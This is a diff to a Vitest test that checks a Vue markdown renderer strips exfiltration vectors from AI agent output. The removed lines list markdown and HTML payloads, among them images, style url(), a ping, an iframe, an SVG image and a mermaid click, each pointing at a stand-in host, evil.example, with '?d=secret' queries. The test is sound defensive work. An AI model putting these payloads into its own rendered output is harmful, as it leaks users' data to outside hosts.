@@ -6,6 +6,7 @@
 import { describe, expect, it, vi } from 'vitest'
 import { createApp, h, nextTick } from 'vue'
 import { Markdown } from 'vue-stream-markdown'
+import { AGENT_VECTORS, EVIL } from '../markdown/exfil-vectors.fixture'
 import { agentMarkdownProps, isAllowedAgentImage, sanitizeAgentNodes } from './markdown-harden'
 
 vi.spyOn(console, 'warn').mockImplementation(() => {})
@@ -32,31 +33,8 @@ function leaks(el: HTMLElement): string[] {
   return out
 }
 
-const E = 'https://evil.example'
-const VECTORS: Record<string, string> = {
-  'markdown image': `![a](${E}/p.png?d=secret)`,
-  'reference image': `![b][r]\n\n[r]: ${E}/ref.png?d=secret`,
-  'protocol-relative image': `![c](//evil.example/pr.png?d=secret)`,
-  'data: image': '![d](data:image/png;base64,iVBORw0KGgo=)',
-  'raw <img>': `<img src="${E}/html.png?d=secret">`,
-  '<style> url()': `<style>p{background:url(${E}/s.png?d=secret)}</style>\n\ntext`,
-  '<link rel=stylesheet>': `<link rel="stylesheet" href="${E}/x.css?d=secret">`,
-  'inline style=url()': `<div style="background:url(${E}/bg.png?d=secret)">hi</div>`,
-  'span style=url(//)': `<span style="background-image:url(//evil.example/b.png)">hi</span>`,
-  '<video poster>': `<video poster="${E}/poster.png?d=secret"></video>`,
-  '<picture><source srcset>': `<picture><source srcset="${E}/src.png?d=secret"><img src="/api/images/ok/raw"></picture>`,
-  '<a ping>': `<a href="https://ok.example" ping="${E}/ping?d=secret">x</a>`,
-  'MDC attributes on markdown': `**s**{style="background:url(${E}/mdc.png)" ping="${E}/p"}`,
-  'MDC component with style': `::callout{style="background:url(${E}/c.png)"}\nhi\n::`,
-  '<svg><image href>': `<svg><image href="${E}/svg.png"></image></svg>`,
-  '<iframe>': `<iframe src="${E}/frame"></iframe>`,
-  '```html fence (previewer iframe)': '```html\n<img src="' + E + '/fence.png?d=secret">\n```',
-  '```HTML fence, uppercase': '```HTML\n<img src="' + E + '/fence2.png?d=secret">\n```',
-  '```html fence never closed': '```html\n<img src="' + E + '/open.png?d=secret">',
-  '```html fence with a style url': '```html\n<div style="background:url(' + E + '/fs.png)">x</div>\n```',
-  '```svg fence': '```svg\n<svg><image href="' + E + '/svgfence.png"/></svg>\n```',
-  '```mermaid fence': '```mermaid\ngraph TD; A-->B; click A "' + E + '/m"\n```'
-}
+const E = EVIL
+const VECTORS = AGENT_VECTORS
 
 describe('agent markdown hardening — real renderer (C1)', () => {
   it.each(Object.entries(VECTORS))('%s: nothing in the DOM references the attacker host', async (_name, md) => {
